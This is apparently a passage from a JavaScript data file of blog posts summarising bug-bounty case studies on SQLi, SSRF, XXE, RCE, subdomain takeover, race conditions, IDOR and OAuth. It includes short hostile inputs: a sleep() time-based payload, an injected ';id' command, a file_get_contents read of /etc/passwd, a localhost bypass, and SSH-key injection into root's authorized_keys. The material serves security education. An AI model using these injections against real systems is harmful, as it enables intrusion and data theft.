[-] Bounty paid: $4,000

Blind SQL injection can also occur outside normal web pages, such as in email unsubscribe links. In Uber’s case, Orange Tsai discovered a base64-encoded URL parameter that was vulnerable. By injecting a time-based payload like sleep(12), he confirmed the vulnerability when the server response was delayed. Since he couldn’t see direct output, he used Boolean checks and a Python script to brute-force database information character by character (such as the database user and name). This demonstrated that attackers can extract sensitive data from blind SQLi vulnerabilities even without visible query results.

[+] Takeaways
When testing encoded parameters, decode them, inject your payload, then reencode the value correctly. Always follow bounty rules—often a simple sleep() delay is enough to prove the vulnerability safely.

## Drupal SQLi
[-] Difficulty: Hard
[-] URL: Any Drupal site using version 7.32 or earlier
[-] Source: https://hackerone.com/reports/31756/
[-] Date reported: October 17, 2014
[-] Bounty paid: $3,000

Drupal, a PHP-based CMS, was affected in 2014 by a critical SQL injection vulnerability in its core database API. Although Drupal used prepared statements for protection, the flaw occurred during the creation of the query template, specifically in how the API handled the SQL IN clause. The expandArguments function assumed structured arrays but failed to properly handle associative array keys, allowing attackers to inject malicious SQL into placeholder names. This made it possible for even anonymous users to manipulate queries, potentially execute multiple SQL statements, and take over unpatched Drupal sites by creating administrative accounts.

[+] Takeaways
This Drupal SQLi required manipulating input structure, not just breaking a query with a quote. A key tip is to modify parameters, like adding [] to turn them into arrays—and see how the application processes them.


## Summary
SQL injection is a serious vulnerability that can give attackers full control of a website, sometimes even allowing them to create admin accounts, as in the Drupal case. When testing for SQLi, try injecting unescaped single or double quotes and watch for subtle signs, especially in blind injections. Also test unexpected input formats—such as passing arrays instead of normal parameters, since altering input structure can reveal hidden vulnerabilities.


[+] See you in next chapter!
`
  },
  {
    id: 110,
    title: "Chapter 10: Server-Side Request Forgery",
    excerpt: "A server-side request forgery (SSRF) vulnerability allows an attacker to make a server perform unintended network request...",
    date: "2023-06-02",
    readTime: "12 min read",
    author: "Hacker00x1",
    image: "/blog-images/Server-Side Request Forgery.png",
    content: `
## Introduction
A Server-Side Request Forgery (SSRF) vulnerability allows an attacker to trick a server into making unintended network requests. Unlike CSRF, which exploits a user, SSRF targets the application server itself. The impact depends on what the server can access internally. However, simply making a server send requests isn’t always a vulnerability, some applications are designed to do this—so it’s important to clearly demonstrate security impact when reporting SSRF.

## Demonstrating the Impact of SSRF
The impact of an SSRF depends on what the vulnerable server can access. In many architectures, public web servers communicate with internal systems (like databases) that aren’t directly exposed to the internet. If SSRF lets an attacker send requests to these internal services, it can expose sensitive data and expand the attack surface.

If internal access isn’t possible, attackers may still exploit SSRF by making the server send requests to external systems they control, allowing them to gather information or manipulate responses. In some cases, redirect responses (like HTTP 301 or 302) can trick the server into accessing internal IPs. Even limited SSRF can be abused through weak URL validation, such as bypassing poorly implemented domain blacklists.

## Invoking GET vs. POST Requests
After confirming an SSRF, check whether you can trigger GET or POST requests. POST-based SSRF can be more dangerous because POST requests often cause state changes, such as creating accounts or executing commands. GET-based SSRF is more commonly used for data retrieval or exfiltration. The overall impact depends on what the vulnerable server can access and how it handles the request.

## Performing Blind SSRFs
If you can trigger SSRF but can’t see the response, it’s a blind SSRF. In this case, attackers extract information indirectly, often using timing differences or DNS requests. For example, they can port-scan internal systems by observing how long requests to common ports (like 22, 80, or 443) take to respond. Another method is out-of-band (OOB) exfiltration, where the server is tricked into making a DNS lookup to an attacker-controlled domain, leaking data (such as command output) through subdomains—often encoded to fit DNS format rules.

## Attacking Users with SSRF Responses
If SSRF can’t access internal systems, you can still exploit it by returning malicious responses, such as XSS or SQLi payloads, that execute in the vulnerable application. For example, if a site fetches a user-supplied URL (like for a profile image), you could supply a link to a page containing an XSS payload. If the site renders or stores that content, it may lead to stored XSS or allow attacks against other users.

When testing for SSRF, look for features that accept URLs or IP addresses and think about how that behavior could be used to access internal systems or trigger other vulnerabilities.

## ESEA SSRF and Querying AWS Metadata
[-] Difficulty: Medium
[-] URL: https://play.esea.net/global/media_preview.php?url=/
[-] Source: http://buer.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/
[-] Date reported: April 11, 2016
[-] Bounty paid: $1,000

In ESEA’s bug bounty program, Brett Buerhaus discovered an SSRF by searching for .php pages with a url= parameter—an immediate red flag. He confirmed the server was fetching and rendering external content, then bypassed file-extension filtering by modifying the URL structure (changing /1.png to ?1.png).

To increase impact, he returned an XSS payload in the server’s response. With further testing, he targeted the AWS metadata endpoint (169.254.169.254), which exposed the internal hostname—proving the SSRF could access sensitive internal resources. This demonstrated how SSRF can escalate from simple external requests to serious cloud infrastructure compromise.

[+] Takeaways
Google dorking can quickly reveal SSRF candidates, especially URLs with parameters like url=. When you find SSRF, aim to demonstrate maximum impact—accessing internal resources (like AWS metadata) is far more serious than a simple XSS proof of concept.

## Google Internal DNS SSRF
[-] Difficulty: Medium
[-] URL: https://toolbox.googleapps.com/
[-] Source: https://www.rcesecurity.com/2017/03/ok-google-give-me-all-your-internal-dns-information/
[-] Date reported: January 2017
[-] Bounty paid: Undisclosed

Some services are designed to make external HTTP/DNS requests—but that functionality can still be abused for SSRF.
Julien Ahrens discovered that Google’s DNS debugging tool allowed users to specify a custom name server. By pointing it to internal IP ranges (like 127.0.0.1 and 10.x.x.x), he confirmed the server would make internal network requests.

By brute-forcing internal subdomains (such as ad.corp.google.com), he retrieved private DNS records containing internal IP addresses—information not accessible through public DNS servers like 8.8.8.8.
This demonstrated a high-impact SSRF: access to Google’s internal network data via a publicly exposed tool.

[+] Takeaways
Look for features that make external HTTP requests. Test whether they allow access to internal IPs like 127.0.0.1 or private ranges. If you can reach internal-only systems, it significantly increases the impact of the SSRF.

## Internal Port Scanning Using Webhooks
[-] Difficulty: Easy
[-] URL: N/A
[-] Source: N/A
[-] Date reported: October 2017
[-] Bounty paid: Undisclosed

User-controlled webhooks can enable SSRF. By bypassing a localhost filter (e.g., using 127.1) and testing different ports, the researcher observed varying error responses—confirming the ability to port scan the internal server, which increased the vulnerability’s impact.

[+] Takeaways
If you can control a URL in webhooks or remote import features, test different ports (e.g., :22, :443, :8080).
Changes in error messages or response times can reveal whether ports are open, closed, or filtered, allowing you to perform internal port scanning via SSRF.


## Summary
SSRF occurs when a server can be manipulated into making unintended network requests, but simply proving a request is possible isn’t enough. The real impact comes from demonstrating meaningful consequences, such as accessing internal systems, retrieving sensitive metadata, or performing internal port scans, showing that the application fails to properly protect its infrastructure.


[+] See you in next chapter!
    `
  },
  {
    id: 111,
    title: "Chapter 11: XML External Entity Attack",
    excerpt: "Attackers can exploit how an application parses eXtensible Markup Language (XML) by taking advantage of an XML External Entity (XXE) vulnerability...",
    date: "2023-06-02",
    readTime: "6 min read",
    author: "Hacker00x1",
    image: "/blog-images/XML External Entity.png",
    content: `
## Introduction
Attackers can exploit how an application parses eXtensible Markup Language (XML) by taking advantage of an XML External Entity (XXE) vulnerability. More specifically, it involves exploiting how the application processes the inclusion of external entities in its input. You can use an XXE to extract information from a server or to call on a malicious server.

## eXtensible Markup Language
XML is a metalanguage designed to structure data rather than display it. Unlike HTML, which uses predefined tags to control how content appears in a browser, XML allows users to create their own custom tags to describe data. An XML document begins with a declaration header and contains nested, user-defined tags, each requiring a closing tag and optionally including attributes. This flexibility makes XML useful for organizing and transporting structured information, though the file itself does not define how the data will be displayed.

## Document Type Definitions
Since XML allows custom tags, documents must follow standard XML rules and conform to a DTD, which defines allowed elements, attributes, and how elements can be nested. The DTD can be included inside the XML file (internal) or referenced from an external source.

[+] External DTDs
An external DTD is a separate file that defines an XML document’s structure, including allowed elements, their content (such as #PCDATA), and attributes using <!ELEMENT> and <!ATTLIST>. The XML file references it with a <!DOCTYPE> declaration and the SYSTEM keyword, which tells the parser to load and apply the DTD rules.

[+] Internal DTDs
A DTD can also be included directly inside an XML document as an internal DTD. In this case, the file starts with the usual XML declaration, followed by a <!DOCTYPE> section that contains the full DTD definitions instead of referencing an external file. The rest of the XML document then appears after this internal DTD declaration.

## XML Entities
XML entities act as placeholders that are replaced with defined content when the document is parsed. They are declared using <!ENTITY> and referenced in the XML with an ampersand (&) and semicolon (;). Entities can store simple text or, using the SYSTEM keyword, fetch content from an external file or URL. In the example, an entity named url retrieves the contents of website.txt, and when &url; is used inside the <Website> tag, the parser replaces it with that file’s content.

## How XXE Attacks Work?
An XXE attack happens when an application parses unvalidated XML and allows external entities. An attacker can define a malicious entity to read sensitive files like /etc/passwd or send their contents to a remote server for exfiltration. The % symbol is used inside DTDs, while & is used in the XML body. Preventing XXE requires disabling external entity processing.

## Read Access to Google
[-] Difficulty: Medium
[-] URL: https://google.com/gadgets/directory?synd=toolbar/
[-] Source: https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/
[-] Date reported: April 2014
[-] Bounty paid: $10,000

In Google’s Toolbar button gallery, uploaded XML files were parsed and displayed without restricting external entities. Attackers exploited this XXE flaw to reference /etc/passwd, causing the server to read and display its contents, demonstrating unauthorized access to internal files.

[+] Takeaways
Even large companies can overlook XXE protections. Any application that accepts XML should be tested for XXE vulnerabilities, and attempting to read files like /etc/passwd is a common way to demonstrate the potential impact.

## Facebook XXE with Microsoft Word
[-] Difficulty: Hard
[-] URL: https://facebook.com/careers/
[-] Source: Attack Secure Blog 
[-] Date reported: April 2014
[-] Bounty paid: $6,300

In 2014, Mohamed Ramadan exploited an XXE vulnerability in Facebook’s careers page by embedding a malicious external DTD inside a .docx file. This caused Facebook’s server to make a remote request to his server, confirming that external entities were being parsed. Although he couldn’t read local files, the vulnerability was verified and rewarded with a bounty.

[+] Takeaways
Many file types like .docx and .xlsx contain XML, so sites that accept them may be vulnerable to XXE if parsing is insecure. If a report is rejected, provide clear proof and continue communicating confidently if you believe the vulnerability is valid.

## Wikiloc XXE
[-] Difficulty: Hard
[-] URL: https://wikiloc.com/
[-] Source: https://www.davidsopas.com/wikiloc-xxe-vulnerability/
[-] Date reported: October 2015
[-] Bounty paid: Swag

Wikiloc allowed users to upload .gpx (XML-based) files, so David Sopas tested the feature for XXE. After confirming the server made external requests by injecting a simple entity, he crafted a more advanced payload that used an external DTD to read the local /etc/issue file and send its contents to his server. By carefully triggering entity evaluation both internally and externally, he successfully demonstrated that Wikiloc’s XML parser allowed file exfiltration via XXE, confirming a serious vulnerability.

[+] Takeaways
This example shows how an attacker can keep a site’s expected XML structure (like a .gpx file) while embedding malicious entities to trigger XXE. By serving a malicious DTD, the attacker can force the server to send sensitive file contents back in a GET request, enabling easy data exfiltration.


## Summary
XXE is a powerful attack vector that can expose sensitive data in multiple ways, such as directly reading /etc/passwd, sending its contents to a remote server, or using a malicious external DTD to trigger a callback with file data. Because of this risk, any feature that accepts XML, especially file uploads, should always be tested for XXE vulnerabilities.


[+] See you in next chapter!
    `
  },
  {
    id: 112,
    title: "Chapter 12: Remote Code Execution Vulnerability",
    excerpt: "A remote code execution (RCE) vulnerability occurs when an application uses user controlled input without sanitizing it...",
    date: "2023-06-02",
    readTime: "12 min read",
    author: "Hacker00x1",
    image: "/blog-images/Remote Code Execution.png",
    content: `
## Introduction
A remote code execution (RCE) vulnerability occurs when an application uses user controlled input without sanitizing it. RCE is typically exploited in one of two ways. The first is by executing shell commands. The second is by executing functions in the programming language that the vulnerable application uses or relies on.

## Executing Shell Commands
RCE can occur when a site passes unsanitized user input directly into a shell command. In the example, the domain parameter is inserted into a ping command, allowing an attacker to append commands like ;id and execute them on the server. While functions like escapeshellcmd() help reduce risk, improper validation can still lead to serious exploitation.

## Executing Functions
RCE can also occur when user input controls which function is executed. In the example, the action parameter is passed directly to PHP’s call_user_func(), allowing a user to specify any function name. By setting action=file_get_contents and id=/etc/passwd, an attacker can make the application read sensitive files. If dangerous functions like system or shell_exec are allowed, this could lead to full command execution on the server.

## Strategies for Escalating Remote Code Execution
RCE can severely impact a server, especially if attackers escalate to executing shell commands or gain higher privileges through local privilege escalation (LPE). Red flags include user-controlled function calls, system commands, special characters, and unrestricted file uploads that allow script execution. Because RCE testing is sensitive, it must be done carefully and responsibly.

## Polyvore ImageMagick
[-] Difficulty: Medium
[-] URL: Polyvore.com (Yahoo! acquisition)
[-] Source: http://nahamsec.com/exploiting-imagemagick-on-yahoo/
[-] Date reported: May 5, 2016
[-] Bounty paid: $2,000

In 2016, ImageMagick had a critical RCE flaw (ImageTragick) caused by unsanitized input in its delegate feature. Attackers could upload malicious image files (like MVG or SVG), even disguised as .jpg, to execute shell commands on vulnerable servers. Researchers demonstrated this by triggering the id command and receiving its output remotely, proving full remote code execution.

[+] Takeaways
Key takeaways: monitor disclosed vulnerabilities to check whether sites have properly patched their software, and recreate exploits in your own lab to ensure your payloads work before testing them in bug bounty programs.

## Algolia RCE on facebooksearch.algolia.com
[-] Difficulty: High
[-] URL: facebooksearch.algolia.com
[-] Source: https://hackerone.com/reports/134321/
[-] Date reported: April 25, 2016
[-] Bounty paid: $500

During reconnaissance with Gitrob, Michiel Prins found that Algolia had exposed its Rails secret_key_base in a public repository. Since this key signs session cookies, its exposure could allow attackers to forge cookies. Because Rails deserializes cookie data, this could potentially lead to remote code execution if exploited.

With the exposed secret_key_base, Prins forged a malicious signed cookie and used a Metasploit deserialization exploit to gain remote code execution. He confirmed access by running id and creating a file on the server as proof.

[+] Takeaways
Automated tools can help uncover exposed secrets in public repositories. While deserialization exploits are complex, tools like Rapid7’s Rails Secret Deserialization and ysoserial make testing vulnerable applications easier.

## RCE Through SSH
[-] Difficulty: High
[-] URL: N/A
[-] Source: blog.jr0ch17.com/2018/No-RCE-then-SSH-to-the-box/
[-] Date reported: Fall 2017
[-] Bounty paid: Undisclosed

Jasmin Landry automated reconnaissance to scan a large scope, using tools to enumerate subdomains, ports, and capture screenshots. He found an outdated open-source CMS with default admin credentials and discovered it was running as root. Further testing revealed an API endpoint that allowed arbitrary file writes via path traversal. By writing his own SSH public key to /root/.ssh/authorized_keys, he gained direct SSH access as root, achieving full remote code execution on the server.

[+] Takeaways
Enumerating subdomains increases attack surface and helps uncover hidden targets. Landry went beyond an initial file-write bug, pivoted to SSH key injection, and demonstrated full root access, showing that proving real impact can significantly strengthen a report and increase the bounty.


## Summary
RCE typically happens when user input isn’t properly sanitized. In these examples, ImageMagick failed to escape input before executing system commands, a leaked Rails secret allowed forged cookies and deserialization abuse, and an arbitrary file-write flaw enabled SSH key injection for root access. Although the techniques differed, all three cases stemmed from applications trusting unsanitized input.


[+] See you in next chapter!
    `
  },
  {
    id: 113,
    title: "Chapter 13: Memory Vulnerabilities",
    excerpt: "This vulnerability occurs when an application improperly manages memory, allowing an attacker to trigger unintended action and potentially execute malicious code...",
    date: "2023-06-02",
    readTime: "8 min read",
    author: "Hacker00x1",
    image: "/blog-images/Memory Vulnerabilities.png",
    content: `
## Introduction
Memory vulnerabilities occur when an application mishandles computer memory while storing or executing code. By exploiting these memory management flaws, an attacker can trigger unintended behavior, potentially allowing them to inject and execute malicious commands.

## Buffer Overflows
A buffer overflow happens when a program writes more data into a buffer than it was allocated to hold, overwriting nearby memory.
In C, this often occurs when functions like strcpy() copy data without checking length. If the destination buffer is too small, extra bytes spill into adjacent variables, causing corrupted data or unpredictable behavior.

On older or lower-level systems, attackers can exploit this to overwrite critical memory (like return addresses) and execute their own code. Modern 64-bit systems reduce some risk due to memory alignment, but the vulnerability still exists if bounds aren’t checked properly.

## Read Out of Bounds
A read out-of-bounds vulnerability occurs when a program reads more memory than intended, potentially exposing sensitive data stored nearby. A well-known example is the Heartbleed flaw in OpenSSL, where attackers exploited a faulty length check in the heartbeat feature to make servers return extra memory beyond the actual message, leaking private keys, passwords, and session data.

## PHP ftp_genlist() Integer Overflow
[-] Difficulty: High
[-] URL: N/A
[-] Source: https://bugs.php.net/bug.php?id=69545/
[-] Date reported: April 28, 2015
[-] Bounty paid: $500

Even memory-managed languages can have memory vulnerabilities. In PHP, which is written in C, Max Spelsberg found a buffer overflow in the FTP extension. By sending more data than a 32-bit unsigned integer could handle (over 2³² bytes), he triggered an overflow that corrupted memory and crashed the server.

[+] Takeaways
Buffer overflows can still exist, even in higher-level languages, especially if they rely on lower-level code like C. Missing length checks are a common cause.

## Python Hotshot Module
[-] Difficulty: High
[-] URL: N/A
[-] Source: http://bugs.python.org/issue24481
[-] Date reported: June 20, 2015
[-] Bounty paid: $500

Although Python manages memory at a high level, its main implementation, CPython, is written in C, which can introduce memory vulnerabilities. In 2015, John Leitch found a buffer overflow in Python’s hotshot module. The issue involved a call to memcpy() that copied user-controlled data into a fixed-size buffer without properly validating its length. Because memcpy() does not perform bounds checking, an attacker could supply a string larger than the allocated buffer, causing memory to overflow into adjacent areas.

[+] Takeaways
To spot buffer overflows, look for unsafe functions like strcpy() and memcpy() and check whether proper length validation is implemented.

## Libcurl Read Out of Bounds
[-] Difficulty: High
[-] URL: N/A
[-] Source: http://curl.haxx.se/docs/adv_20141105.html
[-] Date reported: November 5, 2014
[-] Bounty paid: $1,000

Researcher Symeon Paraschoudis found a vulnerability in libcurl’s curl_easy_duphandle function that could expose sensitive data. When handling POST requests, libcurl incorrectly treated POST data as a null-terminated C string, potentially reading past allocated memory if no null byte was present. It also failed to properly update the data pointer after duplication, meaning it could later read from cleared or reused memory. Together, these flaws could cause memory overreads, crashes, or unintended data leakage.

[+] Takeaways
Even popular tools like cURL can have memory bugs. Focus on functions that copy or handle memory, as they’re common sources of vulnerabilities.


## Summary
Memory vulnerabilities can expose data or enable code execution, but they’re difficult to find. They’re more common in languages like C and C++ that require manual memory management and require deeper technical knowledge to discover.


[+] See you in next chapter!
    `
  },
  {
    id: 114,
    title: "Chapter 14: Subdomain Takeover Vulnerability",
    excerpt: "A subdomain takeover vulnerability occurs when a malicious attacker is able to claim a subdomain from a legitimate site...",
    date: "2023-06-02",
    readTime: "16 min read",
    author: "Hacker00x1",
    image: "/blog-images/Subdomain Takeover.png",
    content: `
## Introduction
A subdomain takeover vulnerability occurs when a malicious attacker is able to claim a subdomain from a legitimate site. Once the attacker controls the subdomain, they either serve their own content or intercept traffic.

[+] Understanding Domain Names
Domains are organized hierarchically, with the top-level domain (like .com) on the right and subdomains (like www.example.com) on the left. Subdomains are created using DNS records, typically A records (pointing to an IP) or CNAME records (pointing to another domain).

[+] How Subdomain Takeovers Work?
A subdomain takeover occurs when a DNS record points to an external service that’s no longer claimed, allowing an attacker to register it and control the subdomain. This has commonly happened with services like Heroku or Amazon S3. Attackers can then host malicious content, steal cookies, or run phishing attacks from what appears to be a legitimate domain.

## Ubiquiti Subdomain Takeover
[-] Difficulty: Low
[-] URL: http://assets.goubiquiti.com/
[-] Source: https://hackerone.com/reports/109699/
[-] Date reported: January 10, 2016
[-] Bounty paid: $500

With Amazon Web Services S3, bucket names are globally unique. If a company points a subdomain to an S3 bucket but doesn’t register (or deletes) that bucket, an attacker can claim it and take over the subdomain.

[+] Takeaways
Watch for DNS records pointing to third-party services like S3 and verify they’re properly configured. If a subdomain is removed but the DNS record remains, it may be vulnerable to takeover. Tools like KnockPy can help monitor and detect these misconfigurations.

## Scan.me Pointing to Zendesk
[-] Difficulty: Low
[-] URL: http://support.scan.me/
[-] Source: https://hackerone.com/reports/114134/
[-] Date reported: February 2, 2016
[-] Bounty paid: $1,000

With Zendesk, a company pointed support.scan.me to scan.zendesk.com. After Snapchat acquired the site, the Zendesk subdomain was released but the CNAME remained, allowing a researcher to claim it and take over the subdomain.

[+] Takeaways
After company acquisitions, infrastructure changes can lead to deleted or migrated subdomains. If DNS records aren’t updated during this transition, they can become vulnerable to subdomain takeovers. Continually monitoring DNS records after acquisition announcements helps catch these issues early.

## Shopify Windsor Subdomain Takeover
[-] Difficulty: Low
[-] URL: http://windsor.shopify.com/
[-] Source: https://hackerone.com/reports/150374/
[-] Date reported: July 10, 2016
[-] Bounty paid: $500

A researcher found that windsor.shopify.com (owned by Shopify) pointed to an external domain that had expired. After discovering it via crt.sh, he purchased the domain and demonstrated a subdomain takeover.

[+] Takeaways
If a subdomain returns a 404 and points to another domain, check whether that domain can be registered. Use crt.sh to find subdomains and Censys to investigate wildcard certificates.

## Snapchat Fastly Takeover
[-] Difficulty: Medium
[-] URL: http://fastly.sc-cdn.net/takeover.html
[-] Source: https://hackerone.com/reports/154425/
[-] Date reported: July 27, 2016
[-] Bounty paid: $3,000

In 2016, Snapchat had a misconfigured CNAME pointing to an unclaimed subdomain on Fastly. A researcher showed it could have allowed a subdomain takeover, potentially serving malicious content to some users.

[+] Takeaways
Look for subdomains returning service errors, review the documentation, and test for misconfigurations. Always confirm ownership and real-world usage before reporting.

## Legal Robot Takeover
[-] Difficulty: Medium
[-] URL: https://api.legalrobot.com/
[-] Source: https://hackerone.com/reports/148770/
[-] Date reported: July 1, 2016
[-] Bounty paid: $100

Frans Rosen found that api.legalrobot.com pointed to Modulus. Although the subdomain was claimed, a wildcard entry was not. By registering it, he was able to take over the subdomain and responsibly demonstrate the issue.

[+] Takeaways
When using third-party services like Modulus, misconfigurations can still allow subdomain takeovers. If you claim one, use a discreet proof of concept.

## Uber SendGrid Mail Takeover
[-] Difficulty: Medium
[-] URL: https://em.uber.com/
[-] Source: https://hackerone.com/reports/156536/
[-] Date reported: August 4, 2016
[-] Bounty paid: $10,000

A researcher found that Uber had misconfigured a subdomain with SendGrid. Because Uber hadn’t fully claimed the email parsing feature, he was able to register it and intercept emails, then responsibly reported the issue.

[+] Takeaways
Review third-party documentation carefully—misconfigurations can create vulnerabilities. Even if services seem protected, verify using resources like can-i-take-over-xyz and test for alternative takeover paths.


## Summary
Subdomain takeovers often occur when DNS records point to unclaimed third-party services like Heroku, Fastly, Amazon S3, Zendesk, or SendGrid, and tools such as KnockPy, crt.sh, and Censys can help identify them; if straightforward exploitation doesn’t work, review service documentation for alternative misconfigurations, and always demonstrate impact with a clear, respectful, and nonintrusive proof of concept.


[+] See you in next chapter!
    `
  },
  {
    id: 115,
    title: "Chapter 15: Race Condition Vulnerability",
    excerpt: "A race condition occurs when two processes race to complete based on an initial condition that becomes invalid while the processes are executing...",
    date: "2023-06-02",
    readTime: "8 min read",
    author: "Hacker00x1",
    image: "/blog-images/Race Condition.png",
    content: `
## Introduction
A race condition happens when two actions run at the same time and both rely on an initial check that becomes invalid before they finish. If the system doesn’t revalidate the condition, both actions may succeed, causing unintended results.

## Accepting an Invite Multiple Times
[-] Difficulty: Low
[-] URL: #
[-] Source: #
[-] Date reported: February 28, 2016
[-] Bounty paid: Swag

When testing for race conditions, look for actions that depend on a check-then-update workflow, such as validating a token, applying logic, then updating a database. In one case, an invite link was meant to be used once. By sending two near-simultaneous acceptance requests from different accounts, both requests passed the initial token check before the database updated, allowing a single invite to be used twice.

[+] Takeaways
You can sometimes test race conditions manually by triggering actions very quickly, but for complex or timing-sensitive cases, automation is more effective because it allows near-simultaneous requests.

## Exceeding Keybase Invitation Limits
[-] Difficulty: Low
[-] URL: https://keybase.io/_/api/1.0/send_invitations.json/
[-] Source: https://hackerone.com/reports/115007/
[-] Date reported: February 5, 2015
[-] Bounty paid: $350

[+] Takeaways
Race conditions often affect action limits. On Keybase, sending multiple invite requests at the same time—using tools like Burp Suite, allowed a user to bypass the three-invite limit. The issue was fixed by adding a locking mechanism.

## Payments Race Condition
[-] Difficulty: Low
[-] URL: N/A
[-] Source: #
[-] Date reported: April 12, 2017
[-] Bounty paid: $1,000

Background jobs can cause race conditions by separating when data is checked from when it’s used. On one platform, changing a PayPal email before a background payment job ran caused duplicate payouts through PayPal. Timing was critical to exploiting the flaw.

[+] Takeaways
If a site processes actions later, it may use a background job. Change conditions after the job is queued and check whether it runs with the new data—act quickly, since processing may happen fast.

## Shopify Partners Race Condition
[-] Difficulty: High
[-] URL: N/A
[-] Source: https://hackerone.com/reports/300305/
[-] Date reported: December 24, 2017
[-] Bounty paid: $15,250

By studying a prior report, Tanner Emek found a race condition in Shopify’s Partners platform. By nearly simultaneously sending an email change request and a verification request, using Burp Suite—he caused the system to verify an email address he didn’t own. This allowed him to request collaborator access to stores tied to that email without admin approval. Shopify fixed the issue by locking account records and requiring explicit approval for collaborator access.

[+] Takeaways
When a site discloses a vulnerability, review the report and retest the affected functionality. Fixes may be incomplete, bypassable, or introduce new issues. Carefully examine verification workflows and consider how developers implemented them—especially whether timing gaps could expose race conditions.


## Summary
Race conditions can occur when an action depends on a condition that changes after execution. Watch for action limits and background job processing. Since timing is critical, exploiting these flaws may require rapid or repeated attempts.


[+] See you in next chapter!
    `
  },
  {
    id: 116,
    title: "Chapter 16: Insecure Direct Object References",
    excerpt: "An insecure direct object reference (IDOR) vulnerability occurs when an attacker can access or modify a reference...",
    date: "2023-06-02",
    readTime: "10 min read",
    author: "Hacker00x1",
    image: "/blog-images/Insecure Direct Object References.png",
    content: `
## Introduction
An insecure direct object reference (IDOR) occurs when a user can access or modify objects, like files or accounts, by manipulating identifiers. For example, if a profile is accessed via user?id=1 and changing it to id=2 reveals another user’s private profile, the application lacks proper authorization checks, resulting in an IDOR vulnerability.

[+] Finding Simple IDORs
Simple IDORs use sequential IDs. Change the id value (±1) to test access. With Burp Suite, automate requests and check responses—consistent 403 errors suggest protection, while 200 responses with varying content may indicate unauthorized access.

[+] Finding More Complex IDORs
Complex IDORs may hide IDs in POST data or unclear parameters. Modify integer values and replay requests with Burp Suite.

For UUIDs, switch between two accounts and look for leaked identifiers in responses or page source. Unauthorized access, even with unguessable IDs, can still be an IDOR if it breaks access controls.

## Binary.com Privilege Escalation
[-] Difficulty: Low
[-] URL: www.binary.com
[-] Source: https://hackerone.com/reports/98247/
[-] Date reported: November 6, 2015
[-] Bounty paid: $300

Mahmoud Gamal discovered an IDOR on Binary.com by testing two accounts simultaneously. He found that a numerically incremented pin parameter in the /cashier iFrame acted as an account identifier. By replacing account B’s pin with account A’s, he accessed A’s financial data and could request withdrawals. The company fixed the issue quickly, noting withdrawals were manually reviewed.

[+] Takeaways
The bug was tested by swapping account pins between users. Tools like Burp Suite can automate this.
Because the ID was inside an iFrame, it was hidden, using a proxy helps capture these background requests and spot vulnerable parameters.

## Moneybird App Creation
[-] Difficulty: Medium
[-] URL: https://moneybird.com/user/applications/
[-] Source: https://hackerone.com/reports/135989/
[-] Date reported: May 3, 2016
[-] Bounty paid: $100

On Moneybird, a limited user modified the exposed administration_id in a POST request using Burp Suite.

This allowed them to create an app with full permissions for another user’s business—an IDOR that bypassed access controls.

[+] Takeaways
Check for id parameters, especially numeric ones. If they aren’t guessable, look for leaks in URLs or responses.

## Twitter Mopub API Token Theft
[-] Difficulty: Medium
[-] URL: https://mopub.com/api/v3/organizations/ID/mopub/activate/
[-] Source: https://hackerone.com/reports/95552/
[-] Date reported: October 24, 2015
[-] Bounty paid: $5,040

Akhil Reni found an IDOR in Twitter’s MoPub that leaked API keys and secrets.He later discovered the leaked build_secret could be used to log into accounts—escalating it to full account takeover.

[+] Takeaways
Confirm the full impact of IDORs. In Twitter’s MoPub, what first looked like data leakage turned out to enable account takeover, greatly increasing severity.

## ACME Customer Information Disclosure
[-] Difficulty: High
[-] URL: https://www.<acme>.com/customer_summary?customer_id=abeZMloJyUovapiXqrHyi0DshH
[-] Source: N/A
[-] Date reported: February 20, 2017
[-] Bounty paid: $3,000

In a private program, an IDOR was initially dismissed because the customer_id seemed unguessable, but it was later found leaking in an order search JSON response, allowing an unprivileged user to access customer data—after proving the ID exposure and broader impact, the report was accepted and paid.

[+] Takeaways
When you find an IDOR, fully assess its impact by searching for leaked or related identifiers that could expand exploitation. If a program rejects your report, don’t be discouraged, keep testing for additional exposure and resubmit if you uncover stronger evidence.


## Summary
IDORs happen when attackers access or modify objects they shouldn’t. Simple cases involve incrementing numeric IDs, while complex ones using UUIDs require hunting for leaked identifiers in JSON, HTML, URLs, or via Google dorks. When reporting, clearly explain real-world impact, bypassing permissions is serious, but demonstrating full account takeover will result in higher severity and bounty.

[+] See you in next chapter!
    `
  },
  {
    id: 117,
    title: "Chapter 17: OAuth Vulnerabilities",
    excerpt: "OAuth is an open authorization protocol that lets users sign in to sites using accounts like Google, Facebook, LinkedIn, or Twitter without creating new credentials...",
    date: "2023-06-02",
    readTime: "8 min read",
    author: "Hacker00x1",
    image: "/blog-images/OAuth Vulnerabilities.png",
    content: `
## Introduction
OAuth is an open authorization protocol that lets users sign in to sites using accounts like Google, Facebook, LinkedIn, or Twitter without creating new credentials. OAuth vulnerabilities usually stem from implementation mistakes and can allow attackers to steal authentication tokens and access user data. There are two incompatible versions—OAuth 1.0a and OAuth 2.0, with most modern applications using OAuth 2.0 and its standard authorization flow.

[+] The OAuth Workflow
OAuth 2.0 involves three roles: the user (resource owner), the app (client), and the resource server (such as Facebook). The client redirects the user to the resource server with parameters like client_id, redirect_uri, scope, and state. After approval, the server returns either an access_token or a code (which is exchanged for a token). The client then uses the token to access the user’s data, and the severity of vulnerabilities depends on the token’s scopes.

## Stealing Slack OAuth Tokens
[-] Difficulty: Low
[-] URL: https://slack.com/oauth/authorize/
[-] Source: http://hackerone.com/reports/2575/
[-] Date reported: March 1, 2013
[-] Bounty paid: $100

An OAuth vulnerability can occur when a site improperly validates the redirect_uri. In one case, Slack only checked the start of the URL, allowing attackers to append a malicious domain and steal OAuth tokens. By tricking a user into visiting the crafted link, the attacker could capture the token and access the victim’s account.

[+] Takeaways
Weak redirect_uri validation is a common OAuth flaw. If domains are loosely whitelisted or not strictly checked, attackers can manipulate redirects to steal tokens. Always test redirection parameters when assessing OAuth security.

## Passing Authentication with Default Passwords
[-] Difficulty: Low
[-] URL: https://flurry.com/auth/v1/account/
[-] Source: https://lightningsecurity.io/blog/password-not-provided/
[-] Date reported: June 30, 2017
[-] Bounty paid: Undisclosed

When testing OAuth, review the entire authentication flow and look for nonstandard or custom HTTP requests, as they often introduce bugs. In 2017, Jack Cable found that Yahoo!’s OAuth integration with Flurry set a default password of "not-provided" for users who signed up via OAuth. This allowed anyone to log in to those accounts using that password. The issue was reported and fixed within hours.

